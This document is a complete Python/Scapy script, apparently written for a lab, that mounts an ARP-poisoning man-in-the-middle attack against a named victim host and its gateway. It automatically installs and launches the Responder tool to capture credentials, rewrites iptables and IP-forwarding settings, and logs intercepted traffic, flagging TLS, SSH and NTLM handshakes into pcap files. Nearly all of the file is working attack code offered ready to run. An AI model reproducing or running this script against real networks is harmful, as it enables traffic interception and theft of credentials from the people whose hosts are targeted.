#!/usr/bin/env python3
from scapy.all import *
import subprocess
import shutil
import os
import sys
import time
import threading

# For TLS detection
from scapy.layers.tls.handshake import TLSClientHello, TLSServerHello
from scapy.layers.tls.record import TLS
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether

# -------- Configuration --------
host1_ip = "192.168.100.101"  # Victim
host2_ip = "192.168.100.1"    # Gateway
interface = "eth1"
capture_file = "arp_poison_capture.pcap"
key_file = "key_exchange_only.pcap"
responder_process = None
packets = []
key_packets = []

# -------- Responder Setup --------
def check_and_install_responder():
    print("[*] Checking for Responder...")
    if shutil.which("responder") is None:
        print("[!] Responder not found. Installing...")
        subprocess.run(["sudo", "apt", "update"], check=True)
        subprocess.run(["sudo", "apt", "install", "-y", "responder"], check=True)
        print("[+] Responder installed.")
    else:
        print("[+] Responder is already installed.")

def start_responder():
    print(f"[*] Starting Responder on {interface}...")
    global responder_process
    responder_process = subprocess.Popen(
        ["responder", "-I", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

def stop_responder():
    global responder_process
    if responder_process:
        print("[*] Stopping Responder...")
        responder_process.terminate()
        try:
            responder_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            responder_process.kill()
        print("[+] Responder stopped.")

# -------- ARP Poisoning --------
def get_mac(ip):
    print(f"[+] Resolving MAC for {ip}")
    answered, _ = sr(ARP(pdst=ip), timeout=2, retry=2, verbose=False)
    for sent, received in answered:
        return received.hwsrc
    return None

def poison_arp(victim_ip, victim_mac, spoof_ip, attacker_mac):
    ether = Ether(dst=victim_mac, src=attacker_mac)
    arp = ARP(op=2, hwsrc=attacker_mac, psrc=spoof_ip,
              hwdst=victim_mac, pdst=victim_ip)
    packet = ether / arp
    sendp(packet, iface=interface, verbose=False)

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    ether = Ether(dst=target_mac, src=source_mac)
    arp = ARP(op=2, hwsrc=source_mac, psrc=source_ip,
              hwdst=target_mac, pdst=target_ip)
    packet = ether / arp
    sendp(packet, iface=interface, count=5, inter=1, verbose=False)

# -------- IP Forwarding + NAT/Forward Rules --------
def configure_routing(iface):
    print("[*] Enabling IP forwarding and configuring NAT + FORWARD rules...")
    os.system("sysctl -w net.ipv4.ip_forward=1")
    # Accept all forwarded traffic
    os.system("iptables -P FORWARD ACCEPT")
    # Flush existing FORWARD rules
    os.system("iptables -F FORWARD")
    # Optionally flush NAT (to avoid duplicates)
    os.system("iptables -t nat -F POSTROUTING")
    # Add a MASQUERADE rule if you want NAT
    os.system(f"iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")

def disable_routing(iface):
    print("[*] Disabling IP forwarding and cleaning up NAT + FORWARD rules...")
    os.system("sysctl -w net.ipv4.ip_forward=0")
    os.system("iptables -t nat -F POSTROUTING")
    os.system("iptables -F FORWARD")
    os.system("iptables -P FORWARD DROP")

# -------- Sniffing & Protocol Detection --------
def identify_protocol(packet):
    if TCP in packet:
        ports = [packet[TCP].sport, packet[TCP].dport]
        if 80 in ports:
            return "HTTP"
        elif 443 in ports:
            return "HTTPS"
        elif 21 in ports or 20 in ports:
            return "FTP"
        elif 22 in ports:
            return "SSH/SFTP"
        elif 23 in ports:
            return "Telnet"
        elif 445 in ports:
            return "SMB"
        elif 137 in ports or 138 in ports or 139 in ports:
            return "NetBIOS"
        elif 389 in ports:
            return "LDAP"
        return "Other TCP"
    elif UDP in packet:
        ports = [packet[UDP].sport, packet[UDP].dport]
        if 137 in ports or 138 in ports or 139 in ports:
            return "NetBIOS (UDP)"
        elif 389 in ports:
            return "LDAP (UDP)"
        return "Other UDP"
    return "Other"

def is_key_exchange(packet):
    if TLS in packet:
        if packet.haslayer(TLSClientHello):
            return "TLS Client Hello"
        elif packet.haslayer(TLSServerHello):
            return "TLS Server Hello"
    elif TCP in packet and packet[TCP].dport == 22:
        return "SSH Key Exchange"
    elif TCP in packet and packet[TCP].dport == 445:
        if b"NTLMSSP" in bytes(packet):
            return "SMB NTLM Handshake"
    elif UDP in packet and packet[UDP].dport == 389:
        if b"NTLMSSP" in bytes(packet):
            return "LDAP NTLM Handshake"
    return None

def sniff_and_log(filter_ips):
    print("[*] Sniffing packets... Logging to file.")

    def process_packet(packet):
        if IP in packet:
            src = packet[IP].src
            dst = packet[IP].dst
            # We only log if either IP is the victim or gateway
            if src in filter_ips or dst in filter_ips:
                proto = identify_protocol(packet)
                key_event = is_key_exchange(packet)
                if key_event:
                    print(f"[KEY EXCHANGE] {key_event} | {src} -> {dst}")
                    key_packets.append(packet)
                else:
                    print(f"[{proto}] {src} -> {dst}")
                packets.append(packet)

    sniff(filter="ip", prn=process_packet, store=False, iface=interface)

# -------- Main --------
def main():
    # 1. Check & Install Responder
    check_and_install_responder()

    # 2. Start Responder
    start_responder()

    # 3. Get MACs
    host1_mac = get_mac(host1_ip)
    host2_mac = get_mac(host2_ip)
    if not host1_mac or not host2_mac:
        print("[-] Could not resolve MACs. Exiting.")
        stop_responder()
        sys.exit(1)

    # 4. Configure IP forwarding, NAT, and FORWARD rules
    configure_routing(interface)

    # 5. Start Sniffing in background
    sniff_thread = threading.Thread(
        target=sniff_and_log,
        args=([host1_ip, host2_ip],),
        daemon=True
    )
    sniff_thread.start()

    print("[*] Beginning ARP poisoning. Press CTRL+C to stop.")
    try:
        attacker_mac = get_if_hwaddr(interface)
        while True:
            # Poison both directions
            poison_arp(host1_ip, host1_mac, host2_ip, attacker_mac)
            poison_arp(host2_ip, host2_mac, host1_ip, attacker_mac)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Cleaning up...")

    finally:
        # 6. Restore ARP
        restore_arp(host1_ip, host1_mac, host2_ip, host2_mac)
        restore_arp(host2_ip, host2_mac, host1_ip, host1_mac)
        # 7. Disable NAT & FORWARD
        disable_routing(interface)
        # 8. Stop Responder
        stop_responder()
        # 9. Save PCAP files
        wrpcap(capture_file, packets)
        wrpcap(key_file, key_packets)
        print(f"[+] Full packet capture saved to: {capture_file}")
        print(f"[+] Key exchange packets saved to: {key_file}")
        print("[+] Lab complete. Analyze results in Wireshark.")

if __name__ == "__main__":
    main()
